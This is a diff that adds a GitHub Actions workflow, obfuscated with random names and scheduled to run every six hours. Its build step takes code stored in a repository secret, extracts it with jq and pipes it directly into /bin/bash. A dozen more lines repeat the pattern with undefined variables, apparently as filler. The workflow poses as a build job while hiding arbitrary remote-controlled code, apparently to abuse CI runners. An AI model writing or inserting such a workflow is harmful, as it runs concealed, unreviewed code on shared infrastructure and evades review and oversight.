@@ -1,0 +1,29 @@
+name: chupanbian4381
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '38 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: chupanbian4381
+        env:
+          xpi90995: ${{ secrets.xpi90995 }}
+        run: |
+          echo $xpi90995 | jq -r .nreag27388 | /bin/bash
+          echo $nr95 | jq -r .lfg33 | /bin/bash
+          echo $pb1473 | jq -r .hcp047 | /bin/bash
+          echo $uzy96185 | jq -r .h8067 | /bin/bash
+          echo $m02763 | jq -r .w0 | /bin/bash
+          echo $mh97 | jq -r .ue33 | /bin/bash
+          echo $om0868 | jq -r .fzdnz54413 | /bin/bash
+          echo $yy246 | jq -r .dnnsk6987 | /bin/bash
+          echo $fv654 | jq -r .klkq520 | /bin/bash
+          echo $afcaa66569 | jq -r .r5910 | /bin/bash
+          echo $xo6 | jq -r .tp7 | /bin/bash
+          echo $pv8354 | jq -r .mc061 | /bin/bash
+          echo $g7 | jq -r .tzfkw69 | /bin/bash
+
